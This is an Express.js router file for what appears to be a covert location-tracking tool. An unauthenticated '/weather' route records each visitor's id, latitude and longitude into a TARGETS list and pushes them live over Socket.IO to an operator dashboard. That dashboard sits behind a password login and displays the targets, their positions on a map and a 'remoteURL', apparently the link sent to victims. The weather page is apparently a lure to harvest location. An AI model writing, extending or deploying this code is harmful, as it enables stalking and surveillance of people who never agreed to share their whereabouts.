const express = require("express")
const router = express.Router()
const config = require("./config")

// Login cookie lifetime: 7 days. The old value (1000000 * 100000 ms) was about 3.2 years.
const COOKIE_MAX_AGE_MS = 7 * 24 * 60 * 60 * 1000
// The Socket.IO server is read from the Express app (server.js sets app "io"); this module uses no globals.


const TARGETS = {}

// login page 
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (!config.username || !config.password) {
        return res.redirect("/login?error=config")
    }

    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: COOKIE_MAX_AGE_MS, httpOnly: true, sameSite: "lax" })
        return res.redirect("/")
    }

    return res.redirect("/login?error=invalid")
})

router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body
    if (id == null || id === "" || lat === "" || lng === "" || !Number.isFinite(Number(lat)) || !Number.isFinite(Number(lng))) {
        return res.status(400).send("Missing or invalid id, lat or lng")
    }
    if (TARGETS[id] == null) {
        req.app.get("io")?.emit("user-connected", id)
    }

    TARGETS[id] = [Number(lat), Number(lng)]
    req.app.get("io")?.emit("map-data", { id, lat: Number(lat), lng: Number(lng) })
    res.send("OK")
    console.log(`> ${id} - ${TARGETS[id]}`)
})

// token checking
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS,
        remoteURL: req.app.get("remoteURL") || ""
    })
})

router.route("/map").get((req, res) => {
    const { id } = req.query

    res.render("map", {
        data: JSON.stringify(TARGETS[id] ?? null)
    })
})


module.exports = router